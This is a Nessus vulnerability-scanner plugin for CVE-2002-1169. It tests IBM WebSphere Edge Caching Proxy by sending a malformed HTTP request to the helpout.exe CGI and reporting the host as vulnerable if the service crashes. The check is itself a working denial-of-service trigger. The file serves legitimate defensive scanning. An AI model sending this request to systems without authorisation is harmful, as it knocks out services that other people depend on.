#
# (C) Tenable Network Security, Inc.
#
########################
# References:
########################
# From:"Rapid 7 Security Advisories" <advisory@rapid7.com>
# Message-ID: <OF0A5563E4.CA3D8582-ON85256C5B.0068EEBC-88256C5B.0068BF86@hq.rapid7.com>
# Date: Wed, 23 Oct 2002 12:08:39 -0700
# Subject: R7-0007: IBM WebSphere Edge Server Caching Proxy Denial of Service
#
########################

include( 'compat.inc' );

if(description)
{
  script_id(11162);
  script_bugtraq_id(6002);
  script_version("$Revision: 1.20 $");
  script_cve_id("CVE-2002-1169");
  script_xref(name:"OSVDB", value:"2090");

  script_name(english:"IBM WebSphere Edge Caching Proxy DoS");
  script_summary(english:"Crashes the remote proxy");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"We could crash the WebSphere Edge caching proxy by sending a
bad request to the helpout.exe CGI"
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to Caching Proxy efix build 4.0.1.26 or later."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://www.packetstormsecurity.org/advisories/misc/R7-0008.txt'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("httpver.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);

banner = get_http_banner(port:port);
if (! banner || "WebSphere" >!< banner ) exit(0);

http_disable_keep_alive();

foreach dir (cgi_dirs())
{
 p = string(dir, "/helpout.exe");
 req = string("GET ", p, " HTTP\r\n\r\n");
 w = http_send_recv_buf(port: port, data: req);

 if(http_is_dead(port: port))
 {
  security_warning(port);
  exit(0);
 }
}
